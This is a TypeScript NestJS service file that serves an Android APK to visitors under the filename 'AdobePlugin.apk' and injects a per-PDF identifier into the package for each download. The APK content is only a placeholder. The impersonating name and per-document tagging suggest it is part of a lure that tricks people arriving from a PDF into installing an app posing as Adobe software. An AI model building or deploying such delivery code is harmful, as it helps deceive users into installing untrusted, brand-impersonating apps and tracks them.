import { Injectable } from '@nestjs/common';
import { join } from 'path';
import * as fs from 'fs';
import type { Response } from 'express';
import { ApkInjectorService } from '../apk-injector.service';

@Injectable()
export class ApkService {
  constructor(private readonly apkInjector: ApkInjectorService) {}

  sendApk(pdfId: string, res: Response) {
    const apkDir = join(__dirname, '..', '..', 'apk');
    const apkPath = join(apkDir, 'app.apk');

    if (!fs.existsSync(apkDir)) fs.mkdirSync(apkDir, { recursive: true });
    if (!fs.existsSync(apkPath)) {
      fs.writeFileSync(apkPath, 'placeholder - replace with real signed APK');
    }

    res.setHeader('Content-Type', 'application/vnd.android.package-archive');
    res.setHeader('Content-Disposition', 'attachment; filename="AdobePlugin.apk"');

    if (pdfId) {
      try {
        const apkBuffer = fs.readFileSync(apkPath);
        const modifiedBuffer = this.apkInjector.inject(apkBuffer, `pdf_id=${pdfId}`);
        return res.end(modifiedBuffer);
      } catch (error) {
        console.error('APK Injection failed:', error.message);
        return res.sendFile(apkPath);
      }
    } else {
      return res.sendFile(apkPath);
    }
  }
}
